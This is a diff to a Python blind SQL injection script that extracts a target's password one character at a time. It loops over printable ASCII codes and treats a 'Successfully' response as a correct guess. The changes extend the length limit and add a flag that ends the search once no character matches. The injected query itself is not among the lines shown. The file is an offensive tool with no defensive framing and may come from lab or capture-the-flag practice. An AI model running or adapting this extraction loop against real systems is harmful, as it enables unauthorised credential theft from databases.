@@ -6,7 +6,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 chars=string.printable
 password=[]
 #YELLOW = "\033[33m"
-
+found=1
 #	only thing left is to deal with '.' and '/' chars since '%' fsreason matches them (doing ASCII may help)
 #	also deal with password end
 #
@@ -14,8 +14,11 @@ password=[]
 
 print("\n--+--  Starting on blind sql probe  --+--\n")
 # CHANGE -> change sqli on line 20 !!!!
-for i in range(1,25):
+for i in range(1,40):
+	if found==0:
+		break
 	for char_dec in range(32,127):
+		found=0
 		#print(f"..trying {i}st character {char_dec} or ",chr(char_dec))
 		#time.sleep(2)
 		#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
@@ -50,6 +53,7 @@ for i in range(1,25):
 			
 		#print(response.text)
 		if('Successfully' in response.text):	#CHANGE -> based on response text on succesful guess
+			found=1
 			password.append(chr(char_dec))
 			print(f"found {i}-th char:",chr(char_dec),"ASCII code:",char_dec)
 			break
